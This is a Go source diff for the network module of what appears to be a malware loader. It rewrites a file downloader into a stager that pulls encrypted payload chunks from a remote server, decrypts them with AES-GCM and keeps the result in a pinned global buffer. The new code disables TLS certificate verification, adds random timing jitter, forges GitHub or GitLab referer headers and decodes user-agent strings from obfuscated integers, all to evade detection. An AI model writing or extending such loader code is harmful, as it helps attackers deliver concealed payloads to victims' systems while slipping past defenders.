@@ -1,38 +1,64 @@
 package net
 
 import (
-	"net/http"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"runtime"
-	"unsafe"
-	"crypto/tls"
-	"time"
 	"math/rand"
+	"net/http"
 	"net/url"
+	"runtime"
 	"strings"
+	"time"
+	"unsafe"
+
 	"loader/pkg/obf"
 )
 
-// Global buffer to prevent GC during execution
+const (
+	NonceLength = 12
+)
+
 var globalBuffer []byte
 
-// GetGlobalBufferRegion returns the memory address and size of the global buffer
-// This can be used with EncryptMemoryRegion to encrypt the downloaded data
+type FileMetadata struct {
+	FileID     string `json:"file_id"`
+	Key        string `json:"key"`         
+	ChunkCount int    `json:"chunk_count"`
+	ChunkSize  int    `json:"chunk_size"`
+	TotalSize  int    `json:"total_size"`
+}
+
+type ChunkData struct {
+	Chunk       string `json:"chunk"`       
+	ChunkNumber int    `json:"chunk_number"`
+	TotalChunks int    `json:"total_chunks"`
+	FileID      string `json:"file_id"`
+}
+
+type FileInfo struct {
+	FileID     string `json:"file_id"`
+	Key        string `json:"key"`         
+	ChunkCount int    `json:"chunk_count"`
+	ChunkSize  int    `json:"chunk_size"`
+	TotalSize  int    `json:"total_size"`
+}
+
 func GetGlobalBufferRegion() (uintptr, uint32, error) {
 	if globalBuffer == nil || len(globalBuffer) == 0 {
 		return 0, 0, fmt.Errorf("global buffer is empty or not initialized")
 	}
 	
-	// Get the memory address of the global buffer
 	bufferAddr := uintptr(unsafe.Pointer(&globalBuffer[0]))
 	bufferSize := uint32(len(globalBuffer))
 	
 	return bufferAddr, bufferSize, nil
 }
 
-// FindBufferRegion finds the memory address and size of any byte slice
-// This is a generic helper that can find the region of any buffer
 func FindBufferRegion(buffer []byte) (uintptr, uint32, error) {
 	if buffer == nil || len(buffer) == 0 {
 		return 0, 0, fmt.Errorf("buffer is empty or nil")
@@ -44,17 +70,40 @@ func FindBufferRegion(buffer []byte) (uintptr, uint32, error) {
 	return bufferAddr, bufferSize, nil
 }
 
-
-func DownloadFile(targetURL string) ([]byte, error) {
-	delay := time.Duration(rand.Intn(400)+100) * time.Millisecond
+func randomJitter(baseMs int, maxJitterMs int) {
+	delay := time.Duration(baseMs+rand.Intn(maxJitterMs)) * time.Millisecond
 	time.Sleep(delay)
-	parsedURL, err := url.Parse(targetURL)
-	if err != nil {
-		return nil, fmt.Errorf("failed to parse URL: %v", err)
+}
+
+func decryptChunk(encryptedChunk []byte, key []byte) ([]byte, error) {
+	if len(encryptedChunk) <= NonceLength {
+		return nil, fmt.Errorf("encrypted chunk too short")
 	}
-	
+
+	nonce := encryptedChunk[:NonceLength]
+	ciphertext := encryptedChunk[NonceLength:]
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
+	}
+
+	aesGCM, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create GCM: %v", err)
+	}
+
+	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decrypt: %v", err)
+	}
+
+	return plaintext, nil
+}
+
+func createSecureClient() *http.Client {
 	tlsConfig := &tls.Config{
-		InsecureSkipVerify: false,
+		InsecureSkipVerify: true, 
 		MinVersion:         tls.VersionTLS12,
 		MaxVersion:         tls.VersionTLS13,
 		CipherSuites: []uint16{
@@ -71,71 +120,173 @@ func DownloadFile(targetURL string) ([]byte, error) {
 		DisableKeepAlives:   true,
 		DisableCompression:  false,
 		MaxIdleConns:        10,
-		IdleConnTimeout:     30 * time.Second,
+		IdleConnTimeout:     60 * time.Second,
 		TLSHandshakeTimeout: 10 * time.Second,
 		ForceAttemptHTTP2:   true,
 	}
 	
 	client := &http.Client{
 		Transport: transport,
-		Timeout:   30 * time.Second,
+		Timeout:   60 * time.Second,
 	}
+	
+	return client
+}
+
+func setCommonHeaders(req *http.Request, targetHost string) {
+	ua := GetUA()
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("DNT", "1")
+	req.Header.Set("Connection", "close")
+	
+	if targetHost != "" {
+		if strings.Contains(targetHost, "github") {
+			req.Header.Set("Referer", "https://github.com/")
+		} else if strings.Contains(targetHost, "gitlab") {
+			req.Header.Set("Referer", "https://gitlab.com/")
+		} else {
+			req.Header.Set("Referer", fmt.Sprintf("https://%s/", targetHost))
+		}
+	}
+}
+
+func getFileInfo(targetURL string) (*FileInfo, error) {
+	randomJitter(100, 300)
+	
+	client := createSecureClient()
+	
 	req, err := http.NewRequest("GET", targetURL, nil)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create request: %v", err)
 	}
 	
-	// Use decoded user agent instead of plaintext array
-	ua := GetUA()
-	req.Header.Set("User-Agent", ua)
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
-	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-	req.Header.Set("DNT", "1")
-	req.Header.Set("Connection", "close")
-	req.Header.Set("Upgrade-Insecure-Requests", "1")
-	req.Header.Set("Sec-Fetch-Dest", "document")
-	req.Header.Set("Sec-Fetch-Mode", "navigate")
-	req.Header.Set("Sec-Fetch-Site", "none")
-	req.Header.Set("Sec-Fetch-User", "?1")
-	req.Header.Set("Cache-Control", "max-age=0")
-	
-	if parsedURL.Host != "" {
-		if strings.Contains(parsedURL.Host, "github") {
-			req.Header.Set("Referer", "https://github.com/")
-		} else if strings.Contains(parsedURL.Host, "gitlab") {
-			req.Header.Set("Referer", "https://gitlab.com/")
-		} else {
-			req.Header.Set("Referer", fmt.Sprintf("https://%s/", parsedURL.Host))
-		}
-	}
+	parsedURL, _ := url.Parse(targetURL)
+	setCommonHeaders(req, parsedURL.Host)
 	
 	resp, err := client.Do(req)
 	if err != nil {
-		return nil, fmt.Errorf("failed to download file: %v", err)
+		return nil, fmt.Errorf("failed to download file info: %v", err)
 	}
 	defer resp.Body.Close()
-	
+
 	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("bad status: %s", resp.Status)
+		return nil, fmt.Errorf("server returned error: %s", resp.Status)
 	}
 	
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		return nil, fmt.Errorf("failed to read response body: %v", err)
+		return nil, fmt.Errorf("failed to read response: %v", err)
 	}
 	
-	// more hacks to get around go garbage collector evil 
-	globalBuffer = make([]byte, len(body))
-	copy(globalBuffer, body)
+	var fileInfo FileInfo
+	if err := json.Unmarshal(body, &fileInfo); err != nil {
+		var metadata FileMetadata
+		if jsonErr := json.Unmarshal(body, &metadata); jsonErr == nil {
+			fileInfo = FileInfo{
+				FileID:     metadata.FileID,
+				Key:        metadata.Key,
+				ChunkCount: metadata.ChunkCount,
+				ChunkSize:  metadata.ChunkSize,
+				TotalSize:  metadata.TotalSize,
+			}
+			return &fileInfo, nil
+		}
+		return nil, fmt.Errorf("failed to parse file info: %v", err)
+	}
+	
+	return &fileInfo, nil
+}
+
+func downloadChunk(serverBase, fileID string, chunkNum int) ([]byte, error) {
+	randomJitter(50, 150)
+	
+	client := createSecureClient()
+	
+	requestURL := fmt.Sprintf("%s/chunk?id=%s&chunk=%d", serverBase, url.QueryEscape(fileID), chunkNum)
+	req, err := http.NewRequest("GET", requestURL, nil)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create request: %v", err)
+	}
+	
+	parsedURL, _ := url.Parse(requestURL)
+	setCommonHeaders(req, parsedURL.Host)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("failed to download chunk: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("server returned error: %s", resp.Status)
+	}
+	
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read response: %v", err)
+	}
+	
+	var chunkData ChunkData
+	if err := json.Unmarshal(body, &chunkData); err != nil {
+		return nil, fmt.Errorf("failed to parse chunk data: %v", err)
+	}
+
+	decodedChunk, err := base64.StdEncoding.DecodeString(chunkData.Chunk)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decode chunk data: %v", err)
+	}
+	
+	return decodedChunk, nil
+}
+
+func DownloadFile(targetURL string) ([]byte, error) {
+	parsedURL, err := url.Parse(targetURL)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse URL: %v", err)
+	}
+	
+	if parsedURL.Scheme == "" || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") {
+		return nil, fmt.Errorf("URL must begin with http:// or https://")
+	}
+	
+	fileInfo, err := getFileInfo(targetURL)
+	if err != nil {
+		return nil, fmt.Errorf("failed to get file info: %v", err)
+	}
+	
+	key, err := base64.StdEncoding.DecodeString(fileInfo.Key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decode encryption key: %v", err)
+	}
+	
+	serverBase := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
+	
+	result := make([]byte, 0, fileInfo.TotalSize)
+	
+	for chunkNum := 0; chunkNum < fileInfo.ChunkCount; chunkNum++ {
+		encryptedChunk, err := downloadChunk(serverBase, fileInfo.FileID, chunkNum)
+		if err != nil {
+			return nil, fmt.Errorf("failed to download chunk %d: %v", chunkNum, err)
+		}
+		
+		plainChunk, err := decryptChunk(encryptedChunk, key)
+		if err != nil {
+			return nil, fmt.Errorf("failed to decrypt chunk %d: %v", chunkNum, err)
+		}
+		
+		result = append(result, plainChunk...)
+		
+		randomJitter(30, 100)
+	}
+	
+	globalBuffer = make([]byte, len(result))
+	copy(globalBuffer, result)
+	
 	ptr := unsafe.Pointer(&globalBuffer[0])
 	runtime.KeepAlive(ptr)
 	runtime.KeepAlive(globalBuffer)
-	result := make([]byte, len(body))
-	copy((*[1 << 30]byte)(unsafe.Pointer(&result[0]))[:len(body)], globalBuffer)
-	
-	delay = time.Duration(rand.Intn(150)+50) * time.Millisecond
-	time.Sleep(delay)
 	
 	return result, nil
 }
@@ -160,7 +311,6 @@ func GetUA() string {
 		2649214766, 3705530546, 2728434626, 4277221896,
 	}
 
-	// Pick a random value from the array
 	randIdx := randomIndex(len(values))
 	return obf.Decode(values[randIdx])
 }
